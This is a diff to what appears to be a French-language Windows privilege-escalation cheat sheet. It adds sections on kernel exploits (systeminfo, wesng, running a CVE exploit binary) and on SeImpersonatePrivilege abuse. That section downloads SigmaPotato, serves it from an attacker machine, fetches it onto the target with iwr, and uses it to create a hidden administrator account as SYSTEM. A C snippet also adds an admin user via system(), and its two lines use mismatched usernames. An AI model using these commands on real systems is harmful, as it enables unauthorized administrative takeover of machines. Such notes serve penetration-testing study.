@@ -286,7 +286,7 @@ icacls "C:\xampp\mysql\bin\mysqld.exe"
 ```c
 #include <stdlib.h>
 int main() {
-  system("net user john Password123! /add");
+  system("net user johndoe Password123! /add");
   system("net localgroup administrators john /add");
   return 0;
 }
@@ -541,3 +541,93 @@ move .\BackendCacheCleanup.exe .\Pictures\
 net user
 net localgroup administrators
 ```
+
+
+### Kernel Exploits
+
+**Enumérer la version Windows et les patches de sécurité installés**
+
+```cmd
+systeminfo
+```
+
+```powershell
+Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
+```
+
+Chercher des CVE sur Google pour le build identifié, ou utiliser [wesng](https://github.com/bitsadmin/wesng) pour automatiser la recherche.
+
+```cmd
+# Cible : exporter systeminfo
+systeminfo > C:\Users\Public\sysinfo.txt
+```
+
+Récupérer `sysinfo.txt` sur Kali et le passer à wesng. Les résultats avec `--exploits-only` indiquent des CVE avec un exploit public disponible.
+
+```bash
+# Kali
+git clone https://github.com/bitsadmin/wesng
+cd wesng
+python wes.py --update
+python wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
+```
+
+
+**Exécuter l'exploit**
+
+```cmd
+.\CVE-2023-29360.exe
+whoami
+```
+
+Les kernel exploits peuvent crasher le système - tester sur un clone avant.
+
+### SeImpersonatePrivilege
+
+`SeImpersonatePrivilege` permet d'usurper l'identité d'un client après authentification. Souvent présent sur les comptes de service IIS (LocalService, NetworkService, ApplicationPoolIdentity).
+
+**Vérifier le privilege**
+
+```cmd
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+```
+
+**Télécharger SigmaPotato et exécuter des commandes en SYSTEM**
+
+```bash
+# Kali : télécharger et servir
+wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
+python3 -m http.server 80
+```
+
+```powershell
+iwr -uri http://<ip>/SigmaPotato.exe -OutFile SigmaPotato.exe
+
+.\SigmaPotato.exe "net user johndoe Password123! /add"
+.\SigmaPotato.exe "cmd /c net user johndoe Password123! /add"
+
+.\SigmaPotato.exe "net localgroup Administrators johndoe /add"
+.\SigmaPotato.exe "cmd /c net localgroup Administrators johndoe /add"
+```
+
+Principe : forcer un processus SYSTEM à s'authentifier sur un named pipe contrôlé, capturer le token, l'impersonate.
+
+Prérequis : `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.
+
+| Outil | Notes |
+|-------|-------|
+| [RottenPotato](https://github.com/breenmachine/RottenPotatoNG) | Le premier, exploite DCOM + NTLM relay local. Obsolète, patché. |
+| [JuicyPotato](https://github.com/ohpe/juicy-potato) | Amélioration de Rotten, choix du CLSID DCOM. Patché sur Windows 10 1809+ / Server 2019+. |
+| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) | Exploite le Spooler via named pipe, fonctionne là où JuicyPotato échoue. |
+| [SweetPotato](https://github.com/CCob/SweetPotato) | Combine JuicyPotato + PrintSpoofer, plus polyvalent. |
+| [GodPotato](https://github.com/BeichenDream/GodPotato) | Exploite IRemUnknown2 via DCOM, fonctionne sur Windows 2012-2022. Le plus fiable actuellement. |
+| [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) | Variante moderne, simple d'utilisation. |
+
+Choix rapide : GodPotato en premier, PrintSpoofer en fallback.
